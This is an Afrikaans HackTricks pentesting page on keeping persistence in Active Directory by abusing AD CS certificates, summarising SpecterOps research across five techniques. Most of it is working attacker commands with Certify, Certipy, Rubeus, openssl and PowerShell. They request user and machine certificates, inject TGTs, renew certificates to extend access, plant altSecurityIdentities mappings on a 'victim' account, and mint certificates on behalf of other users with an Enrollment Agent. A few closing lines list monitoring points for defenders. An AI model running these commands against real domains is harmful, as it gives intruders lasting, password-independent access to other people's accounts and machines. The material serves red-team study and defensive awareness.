# AD CS Rekeningpersistensie

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n klein opsomming van die hoofstukke oor rekeningpersistensie van die wonderlike navorsing vanaf [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Verstaan van diefstal van aktiewe gebruikersbewyse met sertifikate – PERSIST1

In 'n scenario waar 'n sertifikaat wat domeinautentisering toelaat deur 'n gebruiker aangevra kan word, het 'n aanvaller die geleentheid om hierdie sertifikaat aan te vra en te steel om persistensie op 'n netwerk te behou. By verstek laat die `User`-sjabloon in Active Directory sulke versoeke toe, alhoewel dit soms gedeaktiveer kan wees.

Deur [Certify](https://github.com/GhostPack/Certify) of [Certipy](https://github.com/ly4k/Certipy) te gebruik, kan jy soek na geaktiveerde sjablone wat kliëntverifikasie toelaat en dan een aanvra:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Die krag van 'n sertifikaat lê in die vermoë daarvan om as die gebruiker waaraan dit behoort te autentiseer, ongeag wagwoordveranderinge, solank die sertifikaat geldig bly.

Jy kan PEM na PFX omskakel en dit gebruik om 'n TGT te bekom:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: In kombinasie met ander tegnieke (sien THEFT-afdelings), sertifikaatgebaseerde auth maak volhoubare toegang moontlik sonder om LSASS aan te raak en selfs vanuit nie-geëlevateerde kontekste.

## Verkryging van masjienpersistensie met sertifikate - PERSIST2

As 'n aanvaller verhoogde voorregte op 'n gasheer het, kan hulle die gekompromitteerde stelsel se masjienrekening inskryf vir 'n sertifikaat deur die standaard `Machine` templaat te gebruik. Om as die masjien te verifieer skakel S4U2Self vir plaaslike dienste in en kan duurzame gasheerpersistensie verskaf:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Uitbreiding van Persistence deur sertifikaatvernuwing - PERSIST3

Deur die geldigheids- en vernuwingstydperke van sertifikaatsjablone te misbruik, kan 'n aanvaller langtermyn toegang behou. As jy 'n voorheen uitgereikte sertifikaat en sy private sleutel besit, kan jy dit voor die vervaldatum hernu om 'n vars, langlewende credential te verkry sonder om bykomende versoekartefakte te laat wat aan die oorspronklike prinsipaal gekoppel is.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operasionele wenk: Hou die lewensduur van attacker-held PFX files dop en hernu vroeg. Hernuwing kan ook veroorsaak dat opgedateerde sertifikate die moderne SID mapping-uitbreiding insluit, wat dit bruikbaar hou onder strenger DC-mappingreëls (sien volgende afdeling).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

As jy na 'n teikenrekening se `altSecurityIdentities`-attribuut kan skryf, kan jy eksplisiet 'n attacker-controlled sertifikaat aan daardie rekening koppel. Dit bly bestaan oor wagwoordveranderings en, wanneer sterk mapping-formatte gebruik word, funksioneer dit steeds onder moderne DC-afdwinging.

Hoëvlak vloei:

1. Verkry of reik 'n client-auth sertifikaat uit wat jy beheer (e.g., enroll `User` template as yourself).
2. Haal 'n sterk identifiseerder uit die sertifikaat (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Voeg 'n eksplisiete mapping op die slagoffer-prinsipaal se `altSecurityIdentities` by met daardie identifiseerder.
4. Meld aan met jou sertifikaat; die DC map dit na die slagoffer via die eksplisiete mapping.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Outentiseer dan met jou PFX. Certipy sal direk 'n TGT verkry:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Bou Sterk `altSecurityIdentities`-koppelinge

In die praktyk is **Issuer+Serial**- en **SKI**-koppelinge die maklikste sterk formate om te bou vanaf 'n sertifikaat wat deur 'n aanvaller gehou word. Dit maak saak na **February 11, 2025**, wanneer DCs standaard op **Full Enforcement** gestel word en swak koppelinge ophou om betroubaar te wees.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Aantekeninge
- Gebruik slegs sterk mapping-tipes: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Swak formate (Subject/Issuer, Subject-only, RFC822 email) is verouderd en kan deur DC-beleid geblokkeer word.
- Die mapping werk op beide **user** en **computer**-objekte, so skryftoegang tot 'n rekenaarkonto se `altSecurityIdentities` is genoeg om as daardie masjien volhoubaar te bly.
- Die cert-ketting moet bou na 'n wortel wat deur die DC vertrou word. Enterprise CAs in NTAuth word tipies vertrou; sommige omgewings vertrou ook publieke CAs.
- Schannel authentication bly nuttig vir persistensie selfs wanneer PKINIT misluk omdat die DC nie die Smart Card Logon EKU het nie of `KDC_ERR_PADATA_TYPE_NOSUPP` teruggee.

Vir meer oor swak eksplisiete toewysings en aanvalspaaie, sien:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

As jy 'n geldige Certificate Request Agent/Enrollment Agent certificate bekom, kan jy nuwe aanmeldbare sertifikate namens gebruikers na wense uitreik en die agent PFX offline hou as 'n persistensie-token. Misbruik-werkvloei:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Herroeping van die agentsertifikaat of templaat-permissies is vereis om hierdie persistensie te verwyder.

Operasionele notas
- Moderne `Certipy`-weergawes ondersteun beide `-on-behalf-of` en `-renew`, sodat 'n aanvaller wat 'n Enrollment Agent PFX in besit het, leaf certificates kan uitreik en later kan hernu sonder om die oorspronklike teikenrekening weer aan te raak.
- As PKINIT-gebaseerde TGT-herwinning nie moontlik is nie, is die resulterende on-behalf-of-sertifikaat steeds bruikbaar vir Schannel authentication met `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Sterk Sertifikaat-Karteringsafdwinging: Impak op Persistensie

Microsoft KB5014754 het Strong Certificate Mapping Enforcement op domain controllers geïntroduseer. Sedert 11 Februarie 2025 staan DCs standaard op Full Enforcement en verwerp swak/ambigue karterings. Praktiese implikasies:

- Pre-2022 sertifikate wat nie die SID-mapping-uitbreiding bevat nie, kan implisiete kartering laat misluk wanneer DCs op Full Enforcement is. Aanvallers kan toegang behou deur sertifikate via AD CS te hernu (om die SID-uitbreiding te verkry) of deur 'n sterk eksplisiete kartering in `altSecurityIdentities` (PERSIST4) te plant.
- Eksplisiete karterings wat sterk formate gebruik (Issuer+Serial, SKI, SHA1-PublicKey) funksioneer steeds. Swakker formate (Issuer/Subject, Subject-only, RFC822) kan geblokkeer word en behoort vermy te word vir persistensie.

Administrateurs moet monitor en waarsku oor:
- Veranderinge aan `altSecurityIdentities` en uitreikings/hernuwings van Enrollment Agent- en User-sertifikate.
- CA-uitreikingslogboeke vir on-behalf-of-versoeke en ongewone hernuwingspatrone.

## Verwysings

- Microsoft. KB5014754: Sertifikaatgebaseerde authentication veranderings op Windows domain controllers (afdwinging-tydlyn en sterk karterings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (eksplisiete `altSecurityIdentities` misbruik op user/computer-objekte).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Opdragverwysing (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Verifikasie met sertifikate wanneer PKINIT nie ondersteun word nie.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
